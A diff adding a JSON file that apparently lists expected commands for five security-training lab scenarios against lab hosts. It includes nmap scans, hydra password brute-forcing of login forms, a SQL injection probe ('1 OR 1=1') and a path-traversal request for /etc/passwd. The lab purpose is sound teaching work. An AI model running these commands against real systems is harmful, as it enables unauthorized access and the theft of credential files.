@@ -1,0 +1,28 @@
+{
+  "S01": [
+    "nmap -sT -sV -p 2121,2222,5000 recon-lab",
+    "nc -w 2 recon-lab 2222",
+    "curl -I http://recon-lab:5000",
+    "curl -s http://recon-lab:5000/events"
+  ],
+  "S02": [
+    "curl -s http://auth-lab:5000/health",
+    "hydra -l estudiante -P /usr/share/wordlists/demo.txt -s 5000 auth-lab http-post-form \"/auth-http/login:username=^USER^&password=^PASS^:F=auth=fail\"",
+    "curl -s http://auth-lab:5000/attempts"
+  ],
+  "S03": [
+    "curl -s 'http://web-owasp-lab:5000/web/search?q=estudiante'",
+    "curl -s 'http://web-owasp-lab:5000/web/search?q=1%20OR%201=1'",
+    "curl -s 'http://web-owasp-lab:5000/web/file?name=readme.txt'",
+    "curl -s 'http://web-owasp-lab:5000/web/file?name=..%2Fetc%2Fpasswd'"
+  ],
+  "S04": [
+    "nmap -sT -p 5000 auth-services-lab",
+    "hydra -l estudiante -P /usr/share/wordlists/demo.txt -s 5000 auth-services-lab http-post-form \"/auth/login:service=ssh&username=^USER^&password=^PASS^:F=auth=fail\"",
+    "curl -s http://auth-services-lab:5000/attempts"
+  ],
+  "S05": [
+    "curl -s -d 'sender=cliente&message=usuario=estudiante clave=laboratorio123' http://mitm-lab:5000/mitm/send",
+    "curl -s http://mitm-lab:5000/events"
+  ]
+}
